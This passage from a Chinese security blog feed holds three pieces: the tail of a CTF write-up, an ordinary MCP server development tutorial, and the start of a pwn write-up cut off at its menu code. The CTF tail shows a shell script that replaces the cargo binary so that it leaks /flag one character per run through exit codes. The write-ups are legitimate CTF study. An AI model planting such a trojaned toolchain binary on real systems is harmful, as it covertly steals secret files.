下载的依赖缓存</span><br><span class="line">~/.cargo/config.toml  # Cargo 配置文件</span><br></pre></td></tr></table></figure><h4 id="用户级"><a href="#用户级" class="headerlink" title="用户级"></a>用户级</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~/.rustup/toolchains/  # 不同版本工具链</span><br><span class="line"># 例如：</span><br><span class="line">~/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/</span><br><span class="line">~/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/</span><br><span class="line"></span><br><span class="line">~/.cargo/bin/         # rustc, cargo, rustup 等可执行文件</span><br><span class="line">~/.cargo/registry/    # 下载的依赖缓存</span><br><span class="line">~/.cargo/config.toml  # Cargo 配置文件</span><br></pre></td></tr></table></figure><p>下面就是一个替换内容的例子，将cargo替换为以下的脚本，这个脚本将会把flag作为错误状态码依次返回（运行一次返回一次），我们便可以通过不断运行编译流程，此时返回的错误码就为flag的ascii码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">STATE=&quot;/tmp/state.txt&quot;</span><br><span class="line"></span><br><span class="line">if [ ! -f &quot;$STATE&quot; ]; then</span><br><span class="line">    echo 0 &gt; &quot;$STATE&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">FLAG=$(cat /flag)</span><br><span class="line">IDX=$(cat &quot;$STATE&quot;)</span><br><span class="line">CHAR=$(echo &quot;$FLAG&quot; | cut -c$((IDX + 1)))</span><br><span class="line"></span><br><span class="line">if [ -z &quot;$CHAR&quot; ]; then</span><br><span class="line">    exit 255</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">ASCII=$(printf &quot;%d&quot; &quot;&#x27;$CHAR&quot;)</span><br><span class="line">NEXT_IDX=$((IDX + 1))</span><br><span class="line"></span><br><span class="line">echo &quot;$NEXT_IDX&quot; &gt; &quot;$STATE&quot;</span><br><span class="line">exit $ASCII</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全开发-mcp-learn-1</title>
      <link href="/2025/03/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-mcp-learn-1/"/>
      <url>/2025/03/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-mcp-learn-1/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是MCP"><a href="#什么是MCP" class="headerlink" title="什么是MCP"></a>什么是MCP</h2><p>MCP 起源于 2024 年 11 月 25 日 Anthropic发布的文章：<a href="https://www.anthropic.com/news/model-context-protocol">Introducing the Model Context Protocol</a>。</p><p>MCP （Model Context Protocol，模型上下文协议）定义了应用程序和 AI 模型之间交换上下文信息的方式。这使得开发者能够<strong>以一致的方式将各种数据源、工具和功能连接到 AI 模型</strong>（一个中间协议层），就像 USB-C 让不同设备能够通过相同的接口连接一样。MCP 的目标是创建一个通用标准，使 AI 应用程序的开发和集成变得更加简单和统一。</p><p><strong>想象一下没有 MCP 之前我们会怎么做</strong>？我们可能会人工从数据库中筛选或者使用工具检索可能需要的信息，手动的粘贴到 prompt 中。随着我们要解决的问题越来越复杂，<strong>手工</strong>把信息引入到 prompt 中会变得越来越困难。</p><p>为了克服手工 prompt 的局限性，许多 LLM 平台（如 OpenAI、Google）引入了 <code>function call</code> 功能。这一机制允许模型在需要时调用预定义的函数来获取数据或执行操作，显著提升了自动化水平。</p><h2 id="MCP的结构"><a href="#MCP的结构" class="headerlink" title="MCP的结构"></a>MCP的结构</h2><ul><li><strong>MCP Hosts</strong>: 像 Claude Desktop、IDEs 或 AI 工具这样的程序，它们希望通过 MCP 访问资源</li><li><strong>MCP Clients</strong>: 维护与服务器 1:1 连接的协议客户端</li><li><strong>MCP Servers</strong>: 轻量级程序，通过标准化的 Model Context Protocol 暴露特定功能</li><li><strong>Local Resources</strong>: 你的计算机资源（数据库、文件、服务），MCP 服务器可以安全地访问这些资源</li><li><strong>Remote Resources</strong>: 通过互联网可用的资源（例如，通过 APIs），MCP 服务器可以连接到这些资源</li></ul><h2 id="创建MCP-Server"><a href="#创建MCP-Server" class="headerlink" title="创建MCP Server"></a>创建MCP Server</h2><p>使用uv创建应该环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uvx create-mcp-server --path 路径</span><br></pre></td></tr></table></figure><p>然后按照它的提示一步步创建即可，并添加对它的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv add httpx python-dotenv</span><br></pre></td></tr></table></figure><h2 id="编写MCP"><a href="#编写MCP" class="headerlink" title="编写MCP"></a>编写MCP</h2><p>进入项目的src&#x2F;项目同名文件夹，可以看到有以下创建好的两个python文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2025/3/11     19:15           5076 server.py</span><br><span class="line">-a----         2025/3/11     19:15            220 __init__.py</span><br></pre></td></tr></table></figure><p>其中我们进去会发现它已经为我们写好一个可以使用的例子了，但是我们还是需要了解其中内容的结构的。</p><p>首先是server部分，这是mcp能实现功能的关键部分</p><h3 id="资源部分"><a href="#资源部分" class="headerlink" title="资源部分"></a>资源部分</h3><p>当你想让ai访问本地&#x2F;线上资源的时候，ai怎么知道有哪些资源可以访问？又该如何阅读？资源部分就是为了解决这个问题而诞生的，我们只需要为ai声明阅读的uri并实现阅读的方法，就能进行资源使用。</p><h4 id="资源声明结构"><a href="#资源声明结构" class="headerlink" title="资源声明结构"></a>资源声明结构</h4><p>这是资源声明的格式</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">uri</span>: <span class="built_in">string</span>;           <span class="comment">// 资源的唯一标识符</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;          <span class="comment">// 人类可读的名称</span></span><br><span class="line">  description?: <span class="built_in">string</span>;  <span class="comment">// 可选描述</span></span><br><span class="line">  mimeType?: <span class="built_in">string</span>;     <span class="comment">// 可选 MIME 类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">uriTemplate</span>: <span class="built_in">string</span>;   <span class="comment">// 遵循 RFC 6570 的 URI 模板</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;          <span class="comment">// 此类型的人类可读名称</span></span><br><span class="line">  description?: <span class="built_in">string</span>;  <span class="comment">// 可选描述</span></span><br><span class="line">  mimeType?: <span class="built_in">string</span>;     <span class="comment">// 所有匹配资源的可选 MIME 类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式的 URI 进行标识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[protocol]://[host]/[path]</span><br></pre></td></tr></table></figure><p>例如：</p><ul><li><code>file:///home/user/documents/report.pdf</code></li><li><code>postgres://database/customers/schema</code></li><li><code>screen://localhost/display1</code>(获取屏幕信息)</li></ul><p>创建资源标识可以使得资源被ai发现阅览，而这一过程通过以下两个函数传递</p><h4 id="list-resources"><a href="#list-resources" class="headerlink" title="list_resources()"></a>list_resources()</h4><p>这个函数的作用是将资源以列表的列表传递给大模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.list_resources()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">list_resources</span>() -&gt; <span class="built_in">list</span>[types.Resource]:</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="comment"># 直接资源，这里给出的uri是确定的，ai只需要对uri进行选择</span></span><br><span class="line">        types.Resource(</span><br><span class="line">            uri=<span class="string">&quot;uri路径&quot;</span>,</span><br><span class="line">            name=<span class="string">&quot;资源名称&quot;</span>,</span><br><span class="line">            mimeType=<span class="string">&quot;资源类型&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 资源模板，这里的uri是ai根据RFC 6570 的 URI 模板进行自动输入，详情 https://rfc2cn.com/rfc6570.html</span></span><br><span class="line">        types.Resource(</span><br><span class="line">            uriTemplate=<span class="string">&quot;uri路径&quot;</span>,</span><br><span class="line">            name=<span class="string">&quot;资源名称&quot;</span>,</span><br><span class="line">            mimeType=<span class="string">&quot;资源类型&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h4 id="read-resource"><a href="#read-resource" class="headerlink" title="read_resource()"></a>read_resource()</h4><p>处理并阅读其中的资源，将其以自定义的形式返回的大模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.read_resource()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_resource</span>(<span class="params">uri: AnyUrl</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># 根据ai要访问的资源路径进行处理，这里的uri则是由ai生成</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(uri) == <span class="string">&quot;file:///logs/app.log&quot;</span>:   <span class="comment"># 此处根据上面资源文件或是资源模板的uri进行判断来选择执行不同的资源处理</span></span><br><span class="line">        log_contents = <span class="keyword">await</span> read_log_file() <span class="comment"># 任意函数处理文件，最终以string的格式返回给ai</span></span><br><span class="line">        <span class="keyword">return</span> log_contents</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;资源未找到&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="工具部分"><a href="#工具部分" class="headerlink" title="工具部分"></a>工具部分</h3><h4 id="工具结构"><a href="#工具结构" class="headerlink" title="工具结构"></a>工具结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: string;          // 工具的唯一标识符</span><br><span class="line">  description?: string;  // 人类可读的描述</span><br><span class="line">  inputSchema: &#123;         // 工具参数的 JSON Schema</span><br><span class="line">    type: &quot;object&quot;,</span><br><span class="line">    properties: &#123; ... &#125;  // 工具特定的参数</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="list-tools实现工具列表"><a href="#list-tools实现工具列表" class="headerlink" title="list_tools实现工具列表"></a>list_tools实现工具列表</h4><p>这个函数的作用是告诉ai可以使用的工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.list_tools()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_list_tools</span>() -&gt; <span class="built_in">list</span>[types.Tool]:</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        types.Tool(</span><br><span class="line">            name=<span class="string">&quot;工具函数名&quot;</span>,</span><br><span class="line">            description=<span class="string">&quot;工具的描述&quot;</span>,</span><br><span class="line">            inputSchema=&#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span><br><span class="line">                <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;变量名1&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;description&quot;</span>:<span class="string">&quot;变量信息描述&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;变量名2&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;变量名1&quot;</span>, <span class="string">&quot;变量名2&quot;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        )</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="handle-call-tool"><a href="#handle-call-tool" class="headerlink" title="handle_call_tool"></a>handle_call_tool</h4><p>这个函数将根据ai的返回进行分析处理并返回给ai</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.call_tool()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_call_tool</span>(<span class="params"></span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span>, arguments: <span class="built_in">dict</span> | <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">list</span>[types.TextContent | types.ImageContent | types.EmbeddedResource]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Handle tool execution requests.</span></span><br><span class="line"><span class="string">    Tools can modify server state and notify clients of changes.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;函数名&quot;</span>: <span class="comment">#判断当前ai调用的函数</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown tool: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> arguments:<span class="comment">#判断是否输入进参数（参数以dict的格式传入）</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Missing arguments&quot;</span>)</span><br><span class="line"></span><br><span class="line">    变量名<span class="number">1</span> = arguments.get(<span class="string">&quot;变量名1&quot;</span>)</span><br><span class="line">    变量名<span class="number">2</span> = arguments.get(<span class="string">&quot;变量名2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可以添加调用其他的处理函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        types.TextContent(</span><br><span class="line">            <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,</span><br><span class="line">            text=<span class="string">f&quot;返回给ai的内容&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h3 id="提示部分"><a href="#提示部分" class="headerlink" title="提示部分"></a>提示部分</h3><p>我们给了大模型工具的可以访问的资源，但是和人一样，面临很多新的名词可能无法进行理解，如何使用就成了新的问题，提示部分就好比一本说明书，对那些名词进行说明并告知大模型应该怎样进行运行。</p><p>这一过程分为两个部分：</p><ol><li>发现提示</li><li>使用提示</li></ol><h4 id="提示部分结构"><a href="#提示部分结构" class="headerlink" title="提示部分结构"></a>提示部分结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: string;              // 提示的唯一标识符</span><br><span class="line">  description?: string;      // 人类可读的描述</span><br><span class="line">  arguments?: [              // 可选的参数列表</span><br><span class="line">    &#123;</span><br><span class="line">      name: string;          // 参数标识符</span><br><span class="line">      description?: string;  // 参数描述</span><br><span class="line">      required?: boolean;    // 参数是否必需</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定义提示"><a href="#定义提示" class="headerlink" title="定义提示"></a>定义提示</h4><p>那我们如何在python中写这个功能呢？首先需要根据提示结构一个提示的静态变量，用来说明有哪些提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PROMPTS = &#123;</span><br><span class="line">    <span class="string">&quot;git-commit&quot;</span>: types.Prompt(</span><br><span class="line">        name=<span class="string">&quot;git-commit&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;生成 Git 提交消息&quot;</span>,</span><br><span class="line">        arguments=[</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;changes&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;Git diff 或更改描述&quot;</span>,</span><br><span class="line">                required=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">        ],</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&quot;explain-code&quot;</span>: types.Prompt(</span><br><span class="line">        name=<span class="string">&quot;explain-code&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;解释代码如何工作&quot;</span>,</span><br><span class="line">        arguments=[</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;code&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;要解释的代码&quot;</span>,</span><br><span class="line">                required=<span class="literal">True</span></span><br><span class="line">            ),</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;language&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;编程语言&quot;</span>,</span><br><span class="line">                required=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">        ],</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="传递提示列表"><a href="#传递提示列表" class="headerlink" title="传递提示列表"></a>传递提示列表</h4><p>生成提示列表则是为了让ai知晓存在那些提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.list_prompts()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">list_prompts</span>() -&gt; <span class="built_in">list</span>[types.Prompt]:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(PROMPTS.values())</span><br></pre></td></tr></table></figure><p>大模型会对server端进行一次询问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 请求</span><br><span class="line">&#123;</span><br><span class="line">  method: &quot;prompts/list&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时list_prompts则会返回我们的提示信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 响应</span><br><span class="line">&#123;</span><br><span class="line">  prompts: [</span><br><span class="line">    &#123;</span><br><span class="line">      name: &quot;analyze-code&quot;,</span><br><span class="line">      description: &quot;分析代码以寻找潜在的改进&quot;,</span><br><span class="line">      arguments: [</span><br><span class="line">        &#123;</span><br><span class="line">          name: &quot;language&quot;,</span><br><span class="line">          description: &quot;编程语言&quot;,</span><br><span class="line">          required: true</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="get-prompt解析提示"><a href="#get-prompt解析提示" class="headerlink" title="get_prompt解析提示"></a>get_prompt解析提示</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get_prompt()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_prompt</span>(<span class="params"></span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span>, arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>] | <span class="literal">None</span> = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; types.GetPromptResult:</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> PROMPTS:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;未找到提示：<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;提示名&quot;</span>:</span><br><span class="line">        changes = arguments.get(<span class="string">&quot;参数名称&quot;</span>) <span class="keyword">if</span> arguments <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> types.GetPromptResult(</span><br><span class="line">            messages=[</span><br><span class="line">                types.PromptMessage(</span><br><span class="line">                    role=<span class="string">&quot;user&quot;</span>,</span><br><span class="line">                    content=types.TextContent(</span><br><span class="line">                        <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>, <span class="comment"># 类型</span></span><br><span class="line">                        text=<span class="string">f&quot;为这些更改生成简洁但描述性的提交消息：\n\n<span class="subst">&#123;changes&#125;</span>&quot;</span> <span class="comment"># 返回的信息</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;未找到提示实现&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="启动函数"><a href="#启动函数" class="headerlink" title="启动函数"></a>启动函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># Run the server using stdin/stdout streams</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> mcp.server.stdio.stdio_server() <span class="keyword">as</span> (read_stream, write_stream):</span><br><span class="line">        <span class="keyword">await</span> server.run(</span><br><span class="line">            read_stream,</span><br><span class="line">            write_stream,</span><br><span class="line">            InitializationOptions(</span><br><span class="line">                server_name=<span class="string">&quot;项目名称&quot;</span>,</span><br><span class="line">                server_version=<span class="string">&quot;版本&quot;</span>,</span><br><span class="line">                capabilities=server.get_capabilities(</span><br><span class="line">                    notification_options=NotificationOptions(),</span><br><span class="line">                    experimental_capabilities=&#123;&#125;,</span><br><span class="line">                ),</span><br><span class="line">            ),</span><br></pre></td></tr></table></figure><h2 id="放入mcp"><a href="#放入mcp" class="headerlink" title="放入mcp"></a>放入mcp</h2><p>在其设置目录中放入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;mcpServers&quot;: &#123;</span><br><span class="line">        &quot;weather&quot;: &#123;</span><br><span class="line">            &quot;command&quot;: &quot;uv&quot;,</span><br><span class="line">            &quot;args&quot;: [</span><br><span class="line">                &quot;--directory&quot;,</span><br><span class="line">                &quot;项目路径&quot;,</span><br><span class="line">                &quot;run&quot;,</span><br><span class="line">                &quot;项目名称&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> 漏洞发掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2024——cardmaster</title>
      <link href="/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/"/>
      <url>/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/</url>
      
        <content type="html"><![CDATA[<h2 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h2><h3 id="换ld和libc"><a href="#换ld和libc" class="headerlink" title="换ld和libc"></a>换ld和libc</h3><p>此步骤略，但是可以发现是2.27的版本</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>经过分析得到结构体</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1067c29.png" alt="image-20241129114856377" title="1"></p><p>函数的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   CARD MASTER&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. init card set&quot;</span>); <span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. set info&quot;</span>);<span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. get info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. 